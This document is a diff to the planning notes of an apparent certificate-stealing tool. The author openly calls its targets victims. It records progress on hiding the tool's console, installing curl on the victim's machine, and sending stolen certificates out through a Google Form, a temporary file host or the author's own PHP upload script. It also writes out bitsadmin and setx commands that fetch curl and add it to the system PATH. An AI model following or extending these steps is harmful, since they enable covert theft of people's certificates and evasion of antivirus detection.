@@ -15,7 +15,8 @@ TO DO:
 - Debug the first version.                                              ✅
 - Rebuild program, upgrade version.                                     ✅
 - Add transfering to (google disk, email, server, ....)                 ❌
-- Hide console or show fake information                                 ❌
+- Checking/Installing cURL to computer                                  ✅
+- Hide console (or show fake information)                               ✅
 - Hide code (deobfuscate code).                                         ❌
 - Try detecting with different antiviruses.                             ❌
 - Wrap the code to some application (make it background process).       ❌
@@ -67,4 +68,12 @@ Transfering certificates:
 - Then copy share link and write it in google forms: https://forms.gle/QSG9oaR2XfSXptkAA
 - And just Send form :) - it should work anonymously without login.
 - http://leteckaposta.cz/ (30 days then remove)
-- interacting with site with lib: libcurl (curl) *working* with my own domain and PHP file upload script on it. (need to handle how to get CURL on victims computer to be able to use it....) Win10 and later should default have it. 
+- interacting with site with lib: libcurl (curl) *working* with my own domain and PHP file upload script on it. (need to handle how to get CURL on victims computer to be able to use it....) Win10 and laters should default have it. 
+
+### Download cURL with cmd line:
+
+- `bitsadmin /transfer curlDownloadJob /download /priority high https://curl.se/windows/dl-8.1.1_1/curl-8.1.1_1-win64-mingw.zip C:\Users\user\Download\curl.zip`
+- extract to folder in system
+- add to PATH `setx /M PATH "%PATH%;C:\curl"` (need admin rights not cleaver, must be run as ADMIN)
+- reopen cmd and it can be used :)
+
